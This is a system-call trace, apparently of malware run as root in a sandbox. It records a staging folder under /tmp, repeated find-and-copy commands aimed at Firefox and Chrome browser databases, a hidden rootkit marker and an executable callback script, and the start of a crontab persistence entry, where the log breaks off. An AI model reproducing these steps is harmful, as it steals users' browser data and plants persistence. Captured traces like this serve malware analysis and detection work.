+137   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
+137   newfstatat(AT_FDCWD, "/home/app", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
+137   newfstatat(AT_FDCWD, ".", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
+137   openat(AT_FDCWD, "/dev/null", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 3
+137   newfstatat(AT_FDCWD, "/usr/local/sbin/mkdir", 0x7fff41e16560, 0) = -1 ENOENT (No such file or directory)
+137   newfstatat(AT_FDCWD, "/usr/local/bin/mkdir", 0x7fff41e16560, 0) = -1 ENOENT (No such file or directory)
+137   newfstatat(AT_FDCWD, "/usr/sbin/mkdir", 0x7fff41e16560, 0) = -1 ENOENT (No such file or directory)
+137   newfstatat(AT_FDCWD, "/usr/bin/mkdir", {st_mode=S_IFREG|0755, st_size=76296, ...}, 0) = 0
+138   execve("/usr/bin/mkdir", ["mkdir", "-p", "/tmp/.collected/browsers"], 0x626f2e215668 /* 9 vars */) = 0
+138   access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+138   openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
+138   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libselinux.so.1", O_RDONLY|O_CLOEXEC) = 3
+138   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
+138   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libpcre2-8.so.0", O_RDONLY|O_CLOEXEC) = 3
+138   statfs("/sys/fs/selinux", 0x7ffe111e6c90) = -1 ENOENT (No such file or directory)
+138   statfs("/selinux", 0x7ffe111e6c90) = -1 ENOENT (No such file or directory)
+138   openat(AT_FDCWD, "/proc/filesystems", O_RDONLY|O_CLOEXEC) = 3
+138   access("/etc/selinux/config", F_OK) = -1 ENOENT (No such file or directory)
+138   mkdir("/tmp", 0777)               = -1 EEXIST (File exists)
+138   chdir("/tmp")                     = 0
+138   mkdir(".collected", 0777)         = -1 EEXIST (File exists)
+138   chdir(".collected")               = 0
+138   mkdir("browsers", 0777)           = -1 EEXIST (File exists)
+138   newfstatat(AT_FDCWD, "browsers", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
+138   +++ exited with 0 +++
+137   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=138, si_uid=0, si_status=0, si_utime=0, si_stime=0} ---
+137   +++ exited with 0 +++
+117   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=137, si_uid=0, si_status=0, si_utime=0, si_stime=0} ---
+117   newfstatat(AT_FDCWD, "/etc/nsswitch.conf", {st_mode=S_IFREG|0644, st_size=494, ...}, 0) = 0
+117   openat(AT_FDCWD, "/etc/passwd", O_RDONLY|O_CLOEXEC) = 3
+139   execve("/bin/sh", ["sh", "-c", "--", "find /root/.mozilla/firefox -nam"...], 0x7fff79ac5128 /* 9 vars */) = 0
+139   access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+139   openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
+139   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
+139   newfstatat(AT_FDCWD, "/home/app", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
+139   newfstatat(AT_FDCWD, ".", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
+139   openat(AT_FDCWD, "/dev/null", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 3
+139   newfstatat(AT_FDCWD, "/usr/local/sbin/find", 0x7ffd7cffaac0, 0) = -1 ENOENT (No such file or directory)
+139   newfstatat(AT_FDCWD, "/usr/local/bin/find", 0x7ffd7cffaac0, 0) = -1 ENOENT (No such file or directory)
+139   newfstatat(AT_FDCWD, "/usr/sbin/find", 0x7ffd7cffaac0, 0) = -1 ENOENT (No such file or directory)
+139   newfstatat(AT_FDCWD, "/usr/bin/find", {st_mode=S_IFREG|0755, st_size=204264, ...}, 0) = 0
+140   execve("/usr/bin/find", ["find", "/root/.mozilla/firefox", "-name", "*.sqlite", "-exec", "cp", "{}", "/tmp/.collected/browsers/", ";"], 0x64373435c778 /* 9 vars */) = 0
+140   access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+140   openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
+140   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libselinux.so.1", O_RDONLY|O_CLOEXEC) = 3
+140   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
+140   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libpcre2-8.so.0", O_RDONLY|O_CLOEXEC) = 3
+140   statfs("/sys/fs/selinux", 0x7ffe21957560) = -1 ENOENT (No such file or directory)
+140   statfs("/selinux", 0x7ffe21957560) = -1 ENOENT (No such file or directory)
+140   openat(AT_FDCWD, "/proc/filesystems", O_RDONLY|O_CLOEXEC) = 3
+140   access("/etc/selinux/config", F_OK) = -1 ENOENT (No such file or directory)
+140   openat(AT_FDCWD, ".", O_RDONLY|O_CLOEXEC) = 3
+140   newfstatat(AT_FDCWD, "/root/.mozilla/firefox", 0x5d67540134c0, AT_SYMLINK_NOFOLLOW) = -1 ENOENT (No such file or directory)
+140   +++ exited with 1 +++
+139   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=140, si_uid=0, si_status=1, si_utime=0, si_stime=0} ---
+139   +++ exited with 1 +++
+117   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=139, si_uid=0, si_status=1, si_utime=0, si_stime=0} ---
+141   execve("/bin/sh", ["sh", "-c", "--", "find /root/.config/google-chrome"...], 0x7fff79ac5128 /* 9 vars */) = 0
+141   access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+141   openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
+141   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
+141   newfstatat(AT_FDCWD, "/home/app", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
+141   newfstatat(AT_FDCWD, ".", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
+141   openat(AT_FDCWD, "/dev/null", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 3
+141   newfstatat(AT_FDCWD, "/usr/local/sbin/find", 0x7ffffc815020, 0) = -1 ENOENT (No such file or directory)
+141   newfstatat(AT_FDCWD, "/usr/local/bin/find", 0x7ffffc815020, 0) = -1 ENOENT (No such file or directory)
+141   newfstatat(AT_FDCWD, "/usr/sbin/find", 0x7ffffc815020, 0) = -1 ENOENT (No such file or directory)
+141   newfstatat(AT_FDCWD, "/usr/bin/find", {st_mode=S_IFREG|0755, st_size=204264, ...}, 0) = 0
+142   execve("/usr/bin/find", ["find", "/root/.config/google-chrome", "-name", "*.sqlite", "-exec", "cp", "{}", "/tmp/.collected/browsers/", ";"], 0x56cde57397d0 /* 9 vars */) = 0
+142   access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+142   openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
+142   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libselinux.so.1", O_RDONLY|O_CLOEXEC) = 3
+142   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
+142   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libpcre2-8.so.0", O_RDONLY|O_CLOEXEC) = 3
+142   statfs("/sys/fs/selinux", 0x7fff4ed0c060) = -1 ENOENT (No such file or directory)
+142   statfs("/selinux", 0x7fff4ed0c060) = -1 ENOENT (No such file or directory)
+142   openat(AT_FDCWD, "/proc/filesystems", O_RDONLY|O_CLOEXEC) = 3
+142   access("/etc/selinux/config", F_OK) = -1 ENOENT (No such file or directory)
+142   openat(AT_FDCWD, ".", O_RDONLY|O_CLOEXEC) = 3
+142   newfstatat(AT_FDCWD, "/root/.config/google-chrome", 0x6441f86d84c0, AT_SYMLINK_NOFOLLOW) = -1 ENOENT (No such file or directory)
+142   +++ exited with 1 +++
+141   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=142, si_uid=0, si_status=1, si_utime=0, si_stime=0} ---
+141   +++ exited with 1 +++
+117   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=141, si_uid=0, si_status=1, si_utime=0, si_stime=0} ---
+143   execve("/bin/sh", ["sh", "-c", "--", "find /nonexistent/.mozilla/firef"...], 0x7fff79ac5128 /* 9 vars */) = 0
+143   access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+143   openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
+143   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
+143   newfstatat(AT_FDCWD, "/home/app", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
+143   newfstatat(AT_FDCWD, ".", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
+143   openat(AT_FDCWD, "/dev/null", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 3
+143   newfstatat(AT_FDCWD, "/usr/local/sbin/find", 0x7ffff2729ea0, 0) = -1 ENOENT (No such file or directory)
+143   newfstatat(AT_FDCWD, "/usr/local/bin/find", 0x7ffff2729ea0, 0) = -1 ENOENT (No such file or directory)
+143   newfstatat(AT_FDCWD, "/usr/sbin/find", 0x7ffff2729ea0, 0) = -1 ENOENT (No such file or directory)
+143   newfstatat(AT_FDCWD, "/usr/bin/find", {st_mode=S_IFREG|0755, st_size=204264, ...}, 0) = 0
+144   execve("/usr/bin/find", ["find", "/nonexistent/.mozilla/firefox", "-name", "*.sqlite", "-exec", "cp", "{}", "/tmp/.collected/browsers/", ";"], 0x5ba149cc87d0 /* 9 vars */) = 0
+144   access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+144   openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
+144   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libselinux.so.1", O_RDONLY|O_CLOEXEC) = 3
+144   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
+144   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libpcre2-8.so.0", O_RDONLY|O_CLOEXEC) = 3
+144   statfs("/sys/fs/selinux", 0x7ffeb555aff0) = -1 ENOENT (No such file or directory)
+144   statfs("/selinux", 0x7ffeb555aff0) = -1 ENOENT (No such file or directory)
+144   openat(AT_FDCWD, "/proc/filesystems", O_RDONLY|O_CLOEXEC) = 3
+144   access("/etc/selinux/config", F_OK) = -1 ENOENT (No such file or directory)
+144   openat(AT_FDCWD, ".", O_RDONLY|O_CLOEXEC) = 3
+144   newfstatat(AT_FDCWD, "/nonexistent/.mozilla/firefox", 0x59f22231c4c0, AT_SYMLINK_NOFOLLOW) = -1 ENOENT (No such file or directory)
+144   +++ exited with 1 +++
+143   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=144, si_uid=0, si_status=1, si_utime=0, si_stime=0} ---
+143   +++ exited with 1 +++
+117   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=143, si_uid=0, si_status=1, si_utime=0, si_stime=0} ---
+145   execve("/bin/sh", ["sh", "-c", "--", "find /nonexistent/.config/google"...], 0x7fff79ac5128 /* 9 vars */) = 0
+145   access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+145   openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
+145   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
+145   newfstatat(AT_FDCWD, "/home/app", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
+145   newfstatat(AT_FDCWD, ".", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
+145   openat(AT_FDCWD, "/dev/null", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 3
+145   newfstatat(AT_FDCWD, "/usr/local/sbin/find", 0x7fffa3f2a210, 0) = -1 ENOENT (No such file or directory)
+145   newfstatat(AT_FDCWD, "/usr/local/bin/find", 0x7fffa3f2a210, 0) = -1 ENOENT (No such file or directory)
+145   newfstatat(AT_FDCWD, "/usr/sbin/find", 0x7fffa3f2a210, 0) = -1 ENOENT (No such file or directory)
+145   newfstatat(AT_FDCWD, "/usr/bin/find", {st_mode=S_IFREG|0755, st_size=204264, ...}, 0) = 0
+146   execve("/usr/bin/find", ["find", "/nonexistent/.config/google-chro"..., "-name", "*.sqlite", "-exec", "cp", "{}", "/tmp/.collected/browsers/", ";"], 0x64a8c8f9b7d0 /* 9 vars */) = 0
+146   access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+146   openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
+146   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libselinux.so.1", O_RDONLY|O_CLOEXEC) = 3
+146   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
+146   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libpcre2-8.so.0", O_RDONLY|O_CLOEXEC) = 3
+146   statfs("/sys/fs/selinux", 0x7fff1e36da10) = -1 ENOENT (No such file or directory)
+146   statfs("/selinux", 0x7fff1e36da10) = -1 ENOENT (No such file or directory)
+146   openat(AT_FDCWD, "/proc/filesystems", O_RDONLY|O_CLOEXEC) = 3
+146   access("/etc/selinux/config", F_OK) = -1 ENOENT (No such file or directory)
+146   openat(AT_FDCWD, ".", O_RDONLY|O_CLOEXEC) = 3
+146   newfstatat(AT_FDCWD, "/nonexistent/.config/google-chrome", 0x64daadc6c4c0, AT_SYMLINK_NOFOLLOW) = -1 ENOENT (No such file or directory)
+146   +++ exited with 1 +++
+145   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=146, si_uid=0, si_status=1, si_utime=0, si_stime=0} ---
+145   +++ exited with 1 +++
+117   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=145, si_uid=0, si_status=1, si_utime=0, si_stime=0} ---
+147   execve("/bin/sh", ["sh", "-c", "--", "find /home/ubuntu/.mozilla/firef"...], 0x7fff79ac5128 /* 9 vars */) = 0
+147   access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+147   openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
+147   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
+147   newfstatat(AT_FDCWD, "/home/app", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
+147   newfstatat(AT_FDCWD, ".", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
+147   openat(AT_FDCWD, "/dev/null", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 3
+147   newfstatat(AT_FDCWD, "/usr/local/sbin/find", 0x7ffde4556ff0, 0) = -1 ENOENT (No such file or directory)
+147   newfstatat(AT_FDCWD, "/usr/local/bin/find", 0x7ffde4556ff0, 0) = -1 ENOENT (No such file or directory)
+147   newfstatat(AT_FDCWD, "/usr/sbin/find", 0x7ffde4556ff0, 0) = -1 ENOENT (No such file or directory)
+147   newfstatat(AT_FDCWD, "/usr/bin/find", {st_mode=S_IFREG|0755, st_size=204264, ...}, 0) = 0
+148   execve("/usr/bin/find", ["find", "/home/ubuntu/.mozilla/firefox", "-name", "*.sqlite", "-exec", "cp", "{}", "/tmp/.collected/browsers/", ";"], 0x59b0d4c597d0 /* 9 vars */) = 0
+148   access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+148   openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
+148   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libselinux.so.1", O_RDONLY|O_CLOEXEC) = 3
+148   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
+148   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libpcre2-8.so.0", O_RDONLY|O_CLOEXEC) = 3
+148   statfs("/sys/fs/selinux", 0x7ffdbf75f0d0) = -1 ENOENT (No such file or directory)
+148   statfs("/selinux", 0x7ffdbf75f0d0) = -1 ENOENT (No such file or directory)
+148   openat(AT_FDCWD, "/proc/filesystems", O_RDONLY|O_CLOEXEC) = 3
+148   access("/etc/selinux/config", F_OK) = -1 ENOENT (No such file or directory)
+148   openat(AT_FDCWD, ".", O_RDONLY|O_CLOEXEC) = 3
+148   newfstatat(AT_FDCWD, "/home/ubuntu/.mozilla/firefox", 0x6355587bf4c0, AT_SYMLINK_NOFOLLOW) = -1 ENOENT (No such file or directory)
+148   +++ exited with 1 +++
+147   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=148, si_uid=0, si_status=1, si_utime=0, si_stime=0} ---
+147   +++ exited with 1 +++
+117   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=147, si_uid=0, si_status=1, si_utime=0, si_stime=0} ---
+149   execve("/bin/sh", ["sh", "-c", "--", "find /home/ubuntu/.config/google"...], 0x7fff79ac5128 /* 9 vars */) = 0
+149   access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+149   openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
+149   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
+149   newfstatat(AT_FDCWD, "/home/app", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
+149   newfstatat(AT_FDCWD, ".", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
+149   openat(AT_FDCWD, "/dev/null", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 3
+149   newfstatat(AT_FDCWD, "/usr/local/sbin/find", 0x7fff11011860, 0) = -1 ENOENT (No such file or directory)
+149   newfstatat(AT_FDCWD, "/usr/local/bin/find", 0x7fff11011860, 0) = -1 ENOENT (No such file or directory)
+149   newfstatat(AT_FDCWD, "/usr/sbin/find", 0x7fff11011860, 0) = -1 ENOENT (No such file or directory)
+149   newfstatat(AT_FDCWD, "/usr/bin/find", {st_mode=S_IFREG|0755, st_size=204264, ...}, 0) = 0
+150   execve("/usr/bin/find", ["find", "/home/ubuntu/.config/google-chro"..., "-name", "*.sqlite", "-exec", "cp", "{}", "/tmp/.collected/browsers/", ";"], 0x60fa011e87d0 /* 9 vars */) = 0
+150   access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+150   openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
+150   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libselinux.so.1", O_RDONLY|O_CLOEXEC) = 3
+150   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
+150   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libpcre2-8.so.0", O_RDONLY|O_CLOEXEC) = 3
+150   statfs("/sys/fs/selinux", 0x7ffe5a9476b0) = -1 ENOENT (No such file or directory)
+150   statfs("/selinux", 0x7ffe5a9476b0) = -1 ENOENT (No such file or directory)
+150   openat(AT_FDCWD, "/proc/filesystems", O_RDONLY|O_CLOEXEC) = 3
+150   access("/etc/selinux/config", F_OK) = -1 ENOENT (No such file or directory)
+150   openat(AT_FDCWD, ".", O_RDONLY|O_CLOEXEC) = 3
+150   newfstatat(AT_FDCWD, "/home/ubuntu/.config/google-chrome", 0x5b5a6f9734c0, AT_SYMLINK_NOFOLLOW) = -1 ENOENT (No such file or directory)
+150   +++ exited with 1 +++
+149   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=150, si_uid=0, si_status=1, si_utime=0, si_stime=0} ---
+149   +++ exited with 1 +++
+117   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=149, si_uid=0, si_status=1, si_utime=0, si_stime=0} ---
+151   execve("/bin/sh", ["sh", "-c", "--", "find /home/uubuntu/.mozilla/fire"...], 0x7fff79ac5128 /* 9 vars */) = 0
+151   access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+151   openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
+151   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
+151   newfstatat(AT_FDCWD, "/home/app", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
+151   newfstatat(AT_FDCWD, ".", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
+151   openat(AT_FDCWD, "/dev/null", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 3
+151   newfstatat(AT_FDCWD, "/usr/local/sbin/find", 0x7ffe3b983b80, 0) = -1 ENOENT (No such file or directory)
+151   newfstatat(AT_FDCWD, "/usr/local/bin/find", 0x7ffe3b983b80, 0) = -1 ENOENT (No such file or directory)
+151   newfstatat(AT_FDCWD, "/usr/sbin/find", 0x7ffe3b983b80, 0) = -1 ENOENT (No such file or directory)
+151   newfstatat(AT_FDCWD, "/usr/bin/find", {st_mode=S_IFREG|0755, st_size=204264, ...}, 0) = 0
+152   execve("/usr/bin/find", ["find", "/home/uubuntu/.mozilla/firefox", "-name", "*.sqlite", "-exec", "cp", "{}", "/tmp/.collected/browsers/", ";"], 0x5789f30de7d0 /* 9 vars */) = 0
+152   access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+152   openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
+152   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libselinux.so.1", O_RDONLY|O_CLOEXEC) = 3
+152   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
+152   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libpcre2-8.so.0", O_RDONLY|O_CLOEXEC) = 3
+152   statfs("/sys/fs/selinux", 0x7ffd19c7aaf0) = -1 ENOENT (No such file or directory)
+152   statfs("/selinux", 0x7ffd19c7aaf0) = -1 ENOENT (No such file or directory)
+152   openat(AT_FDCWD, "/proc/filesystems", O_RDONLY|O_CLOEXEC) = 3
+152   access("/etc/selinux/config", F_OK) = -1 ENOENT (No such file or directory)
+152   openat(AT_FDCWD, ".", O_RDONLY|O_CLOEXEC) = 3
+152   newfstatat(AT_FDCWD, "/home/uubuntu/.mozilla/firefox", 0x59f3658e54c0, AT_SYMLINK_NOFOLLOW) = -1 ENOENT (No such file or directory)
+152   +++ exited with 1 +++
+151   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=152, si_uid=0, si_status=1, si_utime=0, si_stime=0} ---
+151   +++ exited with 1 +++
+117   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=151, si_uid=0, si_status=1, si_utime=0, si_stime=0} ---
+153   execve("/bin/sh", ["sh", "-c", "--", "find /home/uubuntu/.config/googl"...], 0x7fff79ac5128 /* 9 vars */) = 0
+153   access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+153   openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
+153   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
+153   newfstatat(AT_FDCWD, "/home/app", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
+153   newfstatat(AT_FDCWD, ".", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
+153   openat(AT_FDCWD, "/dev/null", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 3
+153   newfstatat(AT_FDCWD, "/usr/local/sbin/find", 0x7ffdd5288000, 0) = -1 ENOENT (No such file or directory)
+153   newfstatat(AT_FDCWD, "/usr/local/bin/find", 0x7ffdd5288000, 0) = -1 ENOENT (No such file or directory)
+153   newfstatat(AT_FDCWD, "/usr/sbin/find", 0x7ffdd5288000, 0) = -1 ENOENT (No such file or directory)
+153   newfstatat(AT_FDCWD, "/usr/bin/find", {st_mode=S_IFREG|0755, st_size=204264, ...}, 0) = 0
+154   execve("/usr/bin/find", ["find", "/home/uubuntu/.config/google-chr"..., "-name", "*.sqlite", "-exec", "cp", "{}", "/tmp/.collected/browsers/", ";"], 0x593fe29f87d0 /* 9 vars */) = 0
+154   access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+154   openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
+154   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libselinux.so.1", O_RDONLY|O_CLOEXEC) = 3
+154   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
+154   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libpcre2-8.so.0", O_RDONLY|O_CLOEXEC) = 3
+154   statfs("/sys/fs/selinux", 0x7ffec6cac110) = -1 ENOENT (No such file or directory)
+154   statfs("/selinux", 0x7ffec6cac110) = -1 ENOENT (No such file or directory)
+154   openat(AT_FDCWD, "/proc/filesystems", O_RDONLY|O_CLOEXEC) = 3
+154   access("/etc/selinux/config", F_OK) = -1 ENOENT (No such file or directory)
+154   openat(AT_FDCWD, ".", O_RDONLY|O_CLOEXEC) = 3
+154   newfstatat(AT_FDCWD, "/home/uubuntu/.config/google-chrome", 0x5b9f23a924c0, AT_SYMLINK_NOFOLLOW) = -1 ENOENT (No such file or directory)
+154   +++ exited with 1 +++
+153   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=154, si_uid=0, si_status=1, si_utime=0, si_stime=0} ---
+153   +++ exited with 1 +++
+117   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=153, si_uid=0, si_status=1, si_utime=0, si_stime=0} ---
+117   newfstatat(AT_FDCWD, "/etc/nsswitch.conf", {st_mode=S_IFREG|0644, st_size=494, ...}, 0) = 0
+117   openat(AT_FDCWD, "/tmp/.rootkit_marker", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 3
+117   openat(AT_FDCWD, "/tmp/.callback.sh", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 3
+155   execve("/bin/sh", ["sh", "-c", "--", "chmod +x /tmp/.callback.sh"], 0x7fff79ac5128 /* 9 vars */) = 0
+155   access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+155   openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
+155   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
+155   newfstatat(AT_FDCWD, "/home/app", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
+155   newfstatat(AT_FDCWD, ".", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
+155   newfstatat(AT_FDCWD, "/usr/local/sbin/chmod", 0x7ffd3d2cfc60, 0) = -1 ENOENT (No such file or directory)
+155   newfstatat(AT_FDCWD, "/usr/local/bin/chmod", 0x7ffd3d2cfc60, 0) = -1 ENOENT (No such file or directory)
+155   newfstatat(AT_FDCWD, "/usr/sbin/chmod", 0x7ffd3d2cfc60, 0) = -1 ENOENT (No such file or directory)
+155   newfstatat(AT_FDCWD, "/usr/bin/chmod", {st_mode=S_IFREG|0755, st_size=55816, ...}, 0) = 0
+156   execve("/usr/bin/chmod", ["chmod", "+x", "/tmp/.callback.sh"], 0x56724909c5f0 /* 9 vars */) = 0
+156   access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+156   openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
+156   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
+156   newfstatat(AT_FDCWD, "/tmp/.callback.sh", {st_mode=S_IFREG|0755, st_size=107, ...}, 0) = 0
+156   fchmodat(AT_FDCWD, "/tmp/.callback.sh", 0755) = 0
+156   +++ exited with 0 +++
+155   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=156, si_uid=0, si_status=0, si_utime=0, si_stime=0} ---
+155   +++ exited with 0 +++
+117   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=155, si_uid=0, si_status=0, si_utime=0, si_stime=0} ---
+157   execve("/bin/sh", ["sh", "-c", "--", "(crontab -l 2>/dev/null; echo \"0"...], 0x7fff79ac5128 /* 9 vars */) = 0
+157   access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
